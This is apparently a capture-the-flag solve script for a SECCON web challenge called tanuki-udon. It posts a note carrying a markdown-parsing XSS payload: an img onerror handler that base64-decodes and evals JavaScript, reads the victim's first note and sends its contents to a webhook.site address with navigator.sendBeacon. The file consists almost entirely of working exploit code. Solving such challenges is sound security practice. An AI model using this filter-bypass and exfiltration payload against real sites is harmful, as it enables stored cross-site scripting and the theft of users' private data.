import requests
import asyncio
import base64
from bs4 import BeautifulSoup

CHALL_URL='http://tanuki-udon.seccon.games:3000'

BEACON = "https://webhook.site/<webhook>"

def main():
    script = """
(async () => {
    const res = await fetch("/");
    const body = await res.text();
    const parser = new DOMParser();
    const parsed = parser.parseFromString(body, 'text/html');
    const anchors = parsed.querySelectorAll('a');
    const goodAnchors = Array.from(anchors).filter(anchor => anchor.getAttribute('href') !== '/clear'); 
    const note = goodAnchors[0].getAttribute('href');
    const flagReq = await fetch(note);
    const flag = await flagReq.text();
    navigator.sendBeacon('""" + BEACON + """', flag);
})();
    """.strip()
    base64_payload = base64.b64encode(script.encode()).decode()
    payload = f"![![AAA](BBB)](src=x onerror=a=atob`{base64_payload}`;eval.call`a${{a}}`//)"
    r = requests.post(f"{CHALL_URL}/note", data={
        "title": "owo",
        "content": payload
    })
    soup = BeautifulSoup(r.text, 'html.parser')
    anchor_href = soup.find('a')['href']
    print(f"http://web:3000{anchor_href}")


if __name__ == '__main__':
    main()